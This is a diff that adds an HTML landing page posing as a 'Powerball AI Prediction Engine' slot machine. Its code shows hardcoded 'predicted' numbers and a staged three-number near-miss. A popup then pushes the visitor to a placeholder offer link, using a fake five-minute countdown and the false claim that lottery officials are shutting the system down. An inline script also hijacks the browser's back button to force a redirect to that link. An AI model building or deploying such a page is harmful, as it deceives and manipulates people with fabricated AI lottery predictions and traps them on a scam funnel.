@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Powerball AI Slot Machine</title>
+<script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.2/dist/confetti.browser.min.js"></script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#0a0a1a;color:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:20px}
+.logo{font-size:30px;font-weight:900;color:#dc143c;letter-spacing:3px;text-align:center;margin:16px 0 4px}
+.logo span{color:#fff}
+.tagline{font-size:11px;letter-spacing:4px;color:#555;text-align:center;margin-bottom:24px}
+.machine{background:linear-gradient(145deg,#1a1a2e,#0f0f23);border:3px solid #4a4a8a;border-radius:20px;padding:24px;width:100%;max-width:440px;position:relative}
+.machine::before{content:'';position:absolute;top:-1px;left:20%;right:20%;height:3px;background:linear-gradient(90deg,transparent,#7070ff,transparent)}
+.machine-top{text-align:center;margin-bottom:20px}
+.machine-top h2{font-size:13px;letter-spacing:4px;color:#7070ff;text-transform:uppercase}
+.jackpot-row{display:flex;justify-content:center;gap:20px;margin-bottom:20px;padding:12px;background:rgba(112,112,255,0.1);border:1px solid rgba(112,112,255,0.2);border-radius:10px}
+.jackpot-row .item{text-align:center}
+.jackpot-row .item .lbl{font-size:10px;color:#666;letter-spacing:2px;text-transform:uppercase}
+.jackpot-row .item .val{font-size:18px;font-weight:900;color:#ffd700}
+.reels-container{display:flex;gap:6px;justify-content:center;margin-bottom:20px;padding:16px;background:#0a0a14;border:2px solid #2a2a4a;border-radius:12px;position:relative}
+.reels-container::before,.reels-container::after{content:'';position:absolute;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,rgba(220,20,60,0.6),transparent)}
+.reels-container::before{top:14px}
+.reels-container::after{bottom:14px}
+.reel-wrap{width:52px;height:52px;overflow:hidden;border-radius:8px;background:#111;border:1px solid #333;flex-shrink:0;position:relative}
+.reel-wrap.powerball{border-color:#dc143c}
+.reel{display:flex;flex-direction:column;align-items:center;transition:none}
+.reel-item{width:52px;height:52px;display:flex;align-items:center;justify-content:center;font-size:20px;font-weight:900;color:#888;flex-shrink:0}
+.reel-item.active{color:#fff}
+.reel-item.powerball-num{color:#ff6666}
+.result-row{display:flex;gap:8px;justify-content:center;margin-bottom:16px}
+.result-ball{width:48px;height:48px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:18px;font-weight:900;background:#1a1a2e;border:2px solid #333;color:#444;transition:all 0.5s;flex-shrink:0}
+.result-ball.active{background:radial-gradient(circle at 40% 35%,#fff,#ccc);border-color:#aaa;color:#111;transform:scale(1.1)}
+.result-ball.powerball{background:radial-gradient(circle at 40% 35%,#ff6666,#dc143c);border-color:#dc143c;color:#fff}
+.status-bar{text-align:center;font-size:14px;color:#7070ff;min-height:22px;margin-bottom:16px;font-weight:600}
+.lever-area{display:flex;flex-direction:column;align-items:center;gap:10px;margin-bottom:16px}
+.spin-btn{background:linear-gradient(135deg,#dc143c,#ff4444);color:#fff;border:none;padding:16px 48px;font-size:16px;font-weight:900;border-radius:50px;cursor:pointer;letter-spacing:2px;text-transform:uppercase;box-shadow:0 4px 20px rgba(220,20,60,0.4);transition:all 0.2s}
+.spin-btn:hover{transform:translateY(-2px);box-shadow:0 6px 28px rgba(220,20,60,0.6)}
+.spin-btn:active{transform:scale(0.97)}
+.spin-btn:disabled{background:#333;color:#666;cursor:not-allowed;box-shadow:none;transform:none}
+.credits-row{display:flex;justify-content:space-around;font-size:12px;color:#555;padding-top:12px;border-top:1px solid #1a1a2e}
+.credits-row span{text-align:center}
+.credits-row .num{font-size:16px;font-weight:900;color:#7070ff;display:block}
+.popup-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);display:none;justify-content:center;align-items:center;z-index:1000;padding:20px}
+.popup{background:#0f0f23;border:2px solid #7070ff;border-radius:16px;padding:32px 24px;max-width:420px;width:100%;text-align:center;max-height:90vh;overflow-y:auto}
+.popup h2{font-size:20px;font-weight:900;color:#ffd700;margin-bottom:12px}
+.popup p{font-size:14px;color:#aaa;line-height:1.6;margin-bottom:12px}
+.popup .cta{display:block;background:linear-gradient(135deg,#dc143c,#ff4444);color:#fff;padding:16px 24px;border-radius:8px;font-size:15px;font-weight:800;text-decoration:none;margin:20px 0;letter-spacing:1px}
+.popup .warning{font-size:12px;color:#dc143c;font-weight:700;padding:10px;border-radius:6px;border:1px solid rgba(220,20,60,0.3);background:rgba(220,20,60,0.1)}
+.popup .timer{font-size:28px;font-weight:900;color:#dc143c;margin:8px 0}
+.near-miss{text-align:center;font-size:13px;color:#ffd700;font-weight:700;margin-bottom:8px;min-height:20px}
+</style>
+</head>
+<body>
+
+<script>
+const link='SEU_LINK_AQUI';
+function setBackRedirect(url){let u=url.trim()+(url.indexOf('?')>0?'&':'?')+document.location.search.replace('?','').toString();history.pushState({}, '',location.href);history.pushState({}, '',location.href);history.pushState({}, '',location.href);window.addEventListener('popstate',()=>{setTimeout(()=>{location.href=u},1)})}
+setBackRedirect(link);
+</script>
+
+<div class="logo">POWER<span>BALL</span></div>
+<div class="tagline">AI PREDICTION ENGINE v3.1</div>
+
+<div class="machine">
+  <div class="machine-top"><h2>🎰 Number Predictor</h2></div>
+
+  <div class="jackpot-row">
+    <div class="item"><div class="lbl">Next Draw</div><div class="val" id="drawDate">Loading...</div></div>
+    <div class="item"><div class="lbl">Jackpot</div><div class="val">$820M</div></div>
+  </div>
+
+  <div class="reels-container">
+    <div class="reel-wrap" id="rw0"><div class="reel" id="reel0"></div></div>
+    <div class="reel-wrap" id="rw1"><div class="reel" id="reel1"></div></div>
+    <div class="reel-wrap" id="rw2"><div class="reel" id="reel2"></div></div>
+    <div class="reel-wrap" id="rw3"><div class="reel" id="reel3"></div></div>
+    <div class="reel-wrap" id="rw4"><div class="reel" id="reel4"></div></div>
+    <div class="reel-wrap powerball" id="rw5"><div class="reel" id="reel5"></div></div>
+  </div>
+
+  <div class="result-row">
+    <div class="result-ball" id="rb0">?</div>
+    <div class="result-ball" id="rb1">?</div>
+    <div class="result-ball" id="rb2">?</div>
+    <div class="result-ball" id="rb3">?</div>
+    <div class="result-ball" id="rb4">?</div>
+    <div class="result-ball powerball" id="rb5">?</div>
+  </div>
+
+  <div class="near-miss" id="nearMiss"></div>
+  <div class="status-bar" id="statusBar">Press SPIN to predict your numbers</div>
+
+  <div class="lever-area">
+    <button class="spin-btn" id="spinBtn" onclick="handleSpin()">🎰 SPIN</button>
+  </div>
+
+  <div class="credits-row">
+    <span><span class="num" id="spinCount">3</span>Free Spins</span>
+    <span><span class="num" id="matchCount">0</span>Matches</span>
+    <span><span class="num">AI</span>Powered</span>
+  </div>
+</div>
+
+<div class="popup-overlay" id="popupOverlay">
+  <div class="popup">
+    <h2>🎰 JACKPOT SEQUENCE DETECTED!</h2>
+    <p>Your AI analysis found a <strong style="color:#ffd700">high-probability number sequence</strong> for this week's drawing.</p>
+    <p>3 numbers have been confirmed. The remaining 3 require <strong style="color:#fff">Premium AI Access</strong> — watch the short video below to unlock them for free.</p>
+    <a href="SEU_LINK_AQUI" class="cta">🎯 Reveal My Complete Sequence →</a>
+    <div class="warning">⚠️ Lottery officials are actively working to shut down this AI system. This access window closes in:</div>
+    <div class="timer" id="popTimer">05:00</div>
+    <p style="font-size:11px;color:#444">Secure connection · Results valid for current draw only</p>
+  </div>
+</div>
+
+<script>
+const finalNums=[33,17,58,45,62,13];
+let stage=1;
+let spinning=false;
+let spinsLeft=3;
+let matches=0;
+let timerInt=null;
+
+const allNums=Array.from({length:69},(_,i)=>i+1);
+const pbNums=Array.from({length:26},(_,i)=>i+1);
+
+function buildReel(idx){
+  const reel=document.getElementById('reel'+idx);
+  reel.innerHTML='';
+  const pool=idx===5?pbNums:allNums;
+  const shuffled=[...pool].sort(()=>Math.random()-0.5).slice(0,20);
+  if(idx<3){shuffled.push(finalNums[idx])}
+  for(const n of shuffled){
+    const div=document.createElement('div');
+    div.className='reel-item'+(idx===5?' powerball-num':'');
+    div.textContent=n<10?'0'+n:n;
+    reel.appendChild(div);
+  }
+}
+
+function animateReel(idx,finalNum,delay,duration,cb){
+  const reel=document.getElementById('reel'+idx);
+  const items=reel.children;
+  const itemH=52;
+  let pos=0;
+  const speed=80;
+  let elapsed=0;
+  let slowdown=false;
+
+  setTimeout(()=>{
+    const interval=setInterval(()=>{
+      elapsed+=speed;
+      if(elapsed>duration*0.7&&!slowdown){slowdown=true}
+      const step=slowdown?itemH*0.3:itemH;
+      pos=(pos+step)%(items.length*itemH);
+      reel.style.transform=`translateY(-${pos}px)`;
+      if(elapsed>=duration){
+        clearInterval(interval);
+        reel.style.transform=`translateY(0)`;
+        const rb=document.getElementById('rb'+idx);
+        rb.textContent=finalNum<10?'0'+finalNum:finalNum;
+        rb.classList.add('active');
+        const rect=rb.getBoundingClientRect();
+        confetti({particleCount:30,spread:40,origin:{x:(rect.left+24)/window.innerWidth,y:(rect.top+24)/window.innerHeight},colors:['#ffd700','#7070ff','#fff']});
+        if(cb)cb();
+      }
+    },speed);
+  },delay);
+}
+
+function handleSpin(){
+  if(spinning||spinsLeft<=0)return;
+  if(stage===2){showPopup();return}
+  spinning=true;
+  spinsLeft--;
+  document.getElementById('spinCount').textContent=spinsLeft;
+  document.getElementById('spinBtn').disabled=true;
+  document.getElementById('statusBar').textContent='🤖 AI analyzing draw patterns...';
+  document.getElementById('nearMiss').textContent='';
+
+  for(let i=0;i<6;i++){buildReel(i)}
+  for(let i=0;i<6;i++){
+    document.getElementById('rb'+i).classList.remove('active');
+    document.getElementById('rb'+i).textContent='?';
+  }
+
+  const durations=[2000,2400,2800,0,0,0];
+  const delays=[0,200,400,0,0,0];
+
+  let done=0;
+  for(let i=0;i<3;i++){
+    animateReel(i,finalNums[i],delays[i],durations[i],()=>{
+      done++;
+      if(done===3){
+        matches=3;
+        document.getElementById('matchCount').textContent=matches;
+        document.getElementById('statusBar').textContent='✅ 3 numbers locked in! Spin to predict the rest!';
+        document.getElementById('nearMiss').textContent='🔥 3 MATCHES FOUND — Almost there!';
+        document.getElementById('spinBtn').disabled=false;
+        document.getElementById('spinBtn').textContent='🔓 UNLOCK FINAL 3';
+        document.getElementById('spinBtn').style.background='linear-gradient(135deg,#ffd700,#ff9900)';
+        document.getElementById('spinBtn').style.color='#000';
+        spinning=false;
+        stage=2;
+        spinsLeft=1;
+        document.getElementById('spinCount').textContent='1';
+      }
+    });
+  }
+}
+
+function showPopup(){
+  document.getElementById('popupOverlay').style.display='flex';
+  let t=300;
+  const el=document.getElementById('popTimer');
+  timerInt=setInterval(()=>{
+    const m=Math.floor(t/60);const s=t%60;
+    el.textContent=m.toString().padStart(2,'0')+':'+s.toString().padStart(2,'0');
+    if(t>0)t--;else clearInterval(timerInt);
+  },1000);
+}
+
+window.addEventListener('DOMContentLoaded',()=>{
+  for(let i=0;i<6;i++)buildReel(i);
+  const now=new Date();
+  const days=['Sun','Mon','Tue','Wed','Thu','Fri','Sat'];
+  const months=['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
+  let d=new Date(now);
+  for(let i=0;i<7;i++){
+    d.setDate(d.getDate()+1);
+    if([1,3,6].includes(d.getDay()))break;
+  }
+  document.getElementById('drawDate').textContent=days[d.getDay()]+' '+months[d.getMonth()]+' '+d.getDate();
+});
+</script>
+</body>
+</html>
